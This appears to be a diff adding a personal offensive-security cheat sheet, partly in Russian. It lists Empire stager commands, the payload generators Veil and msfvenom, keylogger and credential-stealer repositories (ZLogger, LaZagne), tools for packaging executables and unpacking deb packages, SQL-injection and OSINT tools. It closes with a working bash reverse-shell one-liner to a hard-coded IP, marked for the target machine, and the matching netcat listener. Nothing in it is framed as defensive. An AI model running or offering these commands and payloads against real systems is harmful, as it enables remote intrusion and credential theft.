@@ -1,0 +1,56 @@
+
+
+#==== hack
+--soft
+	empire
+		usestager
+		usestager multi/bash				- for linux
+		info
+			set Listener http
+			set OutFile	/path-to-directory/name
+			execute
+			
+			interact <agent:id>
+				sysinfo
+				
+		
+		
+	veil
+	msfvenom	--> msfconsole
+
+-- keyloggers
+	https://github.com/z00z/ZLogger
+	lazagne
+	https://github.com/z00z/zreporter
+
+-- additional
+	hex-editor
+	bat to exe converter
+	pip install pyinstaller
+		pyinstaller --onefile <filename>
+	
+	dpkg -x <filename> <dirname>	--> извлечение файлов из deb пакета
+	ar -x <filename>		--> извлечение управляющих файлов из deb пакета
+
+-- sql inection
+	burp suite
+	zap proxy
+	metasploit
+	SQLMap
+
+--pentest
+	burpsuite
+	zaproxy
+
+#==== anom
+
+#==== osint
+
+-- tools
+maltego
+https://www.spiderfoot.net/hx/ 
+
+#-- linux
+bash -i >& /dev/tcp/192.168.43.123/8080 0>&1	- на целевой машине
+nc -vv -l -p 8080				- на kali
+
